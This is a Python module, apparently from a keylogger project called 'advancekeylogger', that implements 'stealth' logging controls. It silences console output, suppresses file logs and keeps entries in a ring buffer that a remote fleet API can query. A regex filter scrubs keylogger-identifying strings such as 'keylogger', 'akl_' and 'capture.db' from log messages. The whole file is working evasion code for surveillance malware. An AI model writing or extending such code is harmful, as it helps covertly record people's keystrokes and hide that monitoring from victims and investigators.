"""
Logging stealth controller.

Provides:
  - Silent mode (suppress all console output)
  - File log suppression
  - Memory ring-buffer handler (keeps last N entries, queryable for remote debug)
  - Log sanitisation filter (scrubs identifiable strings)
  - Startup banner suppression

Usage::

    from stealth.log_controller import LogController

    ctrl = LogController(config)
    ctrl.apply()
"""
from __future__ import annotations

import collections
import logging
import re
import time
from typing import Any

logger = logging.getLogger(__name__)

# ── Patterns to scrub from log messages ──────────────────────────────

_SCRUB_PATTERNS = [
    re.compile(r"(?i)keylog(?:ger)?"),
    re.compile(r"(?i)advancekeylog(?:ger)?"),
    re.compile(r"(?i)akl_"),
    re.compile(r"(?i)capture(?:s)?\.db"),
    re.compile(r"/tmp/advancekeylogger\.pid"),
]

_SCRUB_REPLACEMENT = "***"


class MemoryRingBufferHandler(logging.Handler):
    """Logging handler that stores entries in a bounded in-memory deque.

    Useful for remote debugging via the fleet API when file logging
    is disabled in stealth mode.
    """

    def __init__(self, capacity: int = 500) -> None:
        super().__init__()
        self.buffer: collections.deque[dict[str, Any]] = collections.deque(maxlen=capacity)

    def emit(self, record: logging.LogRecord) -> None:
        try:
            entry = {
                "ts": record.created,
                "level": record.levelname,
                "name": record.name,
                "msg": self.format(record),
            }
            self.buffer.append(entry)
        except Exception:
            self.handleError(record)

    def get_entries(self, limit: int = 100) -> list[dict[str, Any]]:
        """Return the most recent *limit* entries."""
        entries = list(self.buffer)
        return entries[-limit:]

    def clear(self) -> None:
        self.buffer.clear()


class LogSanitisationFilter(logging.Filter):
    """Filter that scrubs identifiable strings from log messages."""

    def filter(self, record: logging.LogRecord) -> bool:
        msg = record.getMessage()
        for pattern in _SCRUB_PATTERNS:
            msg = pattern.sub(_SCRUB_REPLACEMENT, msg)
        # Overwrite the cached message
        record.msg = msg
        record.args = None
        return True


class LogController:
    """Manages logging stealth measures.

    Parameters
    ----------
    config : dict
        The ``stealth.logging`` section of the configuration.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._silent_mode: bool = bool(cfg.get("silent_mode", False))
        self._suppress_file_log: bool = bool(cfg.get("suppress_file_log", False))
        self._memory_ring_buffer: bool = bool(cfg.get("memory_ring_buffer", True))
        self._ring_buffer_size: int = int(cfg.get("ring_buffer_size", 500))
        self._sanitize_messages: bool = bool(cfg.get("sanitize_messages", True))
        self._suppress_startup_banner: bool = bool(cfg.get("suppress_startup_banner", True))
        self._ring_handler: MemoryRingBufferHandler | None = None
        self._applied = False

    # ── Public API ───────────────────────────────────────────────────

    def apply(self) -> None:
        """Apply logging stealth measures to the root logger."""
        if self._applied:
            return

        root = logging.getLogger()

        # Silent mode: remove all console (stream) handlers
        if self._silent_mode:
            root.handlers = [
                h for h in root.handlers
                if not isinstance(h, logging.StreamHandler)
                or isinstance(h, logging.FileHandler)
            ]

        # Suppress file logging
        if self._suppress_file_log:
            root.handlers = [
                h for h in root.handlers
                if not isinstance(h, logging.FileHandler)
            ]

        # Add memory ring buffer
        if self._memory_ring_buffer:
            self._ring_handler = MemoryRingBufferHandler(self._ring_buffer_size)
            formatter = logging.Formatter(
                fmt="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
                datefmt="%H:%M:%S",
            )
            self._ring_handler.setFormatter(formatter)
            root.addHandler(self._ring_handler)

        # Add sanitisation filter
        if self._sanitize_messages:
            san_filter = LogSanitisationFilter()
            for handler in root.handlers:
                handler.addFilter(san_filter)

        self._applied = True

    @property
    def suppress_startup_banner(self) -> bool:
        """Whether the startup system-info banner should be suppressed."""
        return self._suppress_startup_banner

    def get_ring_buffer(self) -> MemoryRingBufferHandler | None:
        """Return the ring buffer handler for remote querying."""
        return self._ring_handler

    def get_recent_logs(self, limit: int = 100) -> list[dict[str, Any]]:
        """Convenience method to get recent log entries from the ring buffer."""
        if self._ring_handler is None:
            return []
        return self._ring_handler.get_entries(limit)
